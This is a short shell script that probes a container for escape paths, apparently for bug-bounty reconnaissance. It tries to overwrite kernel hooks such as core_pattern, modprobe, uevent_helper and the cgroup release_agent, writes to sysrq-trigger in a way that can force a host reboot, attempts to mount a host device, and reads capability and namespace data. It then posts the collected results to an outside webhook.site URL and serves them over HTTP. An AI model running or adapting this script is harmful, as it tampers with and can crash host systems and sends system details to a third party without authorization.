#!/bin/sh
{
echo "==core_pattern=="; cat /proc/sys/kernel/core_pattern 2>&1; echo "bbh" > /proc/sys/kernel/core_pattern 2>&1 && echo "CORE_PATTERN WRITABLE" || echo "core_pattern not writable"
echo "==modprobe=="; echo "bbh" > /proc/sys/kernel/modprobe 2>&1 && echo "MODPROBE WRITABLE" || echo "modprobe not writable"
echo "==uevent=="; echo "bbh" > /sys/kernel/uevent_helper 2>&1 && echo "UEVENT WRITABLE" || echo "uevent not writable"
echo "==sysrq=="; echo b > /proc/sysrq-trigger 2>&1 && echo "SYSRQ WRITABLE" || echo "sysrq not writable"
echo "==cgroup-v1=="; ls /sys/fs/cgroup/ 2>&1 | head; cat /sys/fs/cgroup/release_agent 2>&1; echo "x" > /sys/fs/cgroup/release_agent 2>&1 && echo "RELEASE_AGENT WRITABLE" || echo "release_agent not writable"
echo "==cgroup-v2=="; ls /sys/fs/cgroup/*. 2>&1 | head; cat /sys/fs/cgroup/cgroup.controllers 2>&1
echo "==mount-host=="; mount /dev/mapper/0f2a695d-a947-456e-9a7f-603a70d3bfb5 /mnt 2>&1 && echo "MOUNTED" || echo "mount failed"
echo "==proc-sys-writable=="; for f in /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe /proc/sys/kernel/hostname /proc/sys/kernel/ns_last_pid; do [ -w "$f" ] && echo "WRITABLE $f"; done
echo "==ns=="; ls -la /proc/1/ns/ 2>&1; echo "priority:"; cat /proc/1/status 2>&1 | grep -iE 'NSpid|CapEff'
echo "==devices=="; ls -la /dev/ 2>&1 | head -20
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr6" >/dev/null 2>&1
httpd -f -p 8080 -h /www
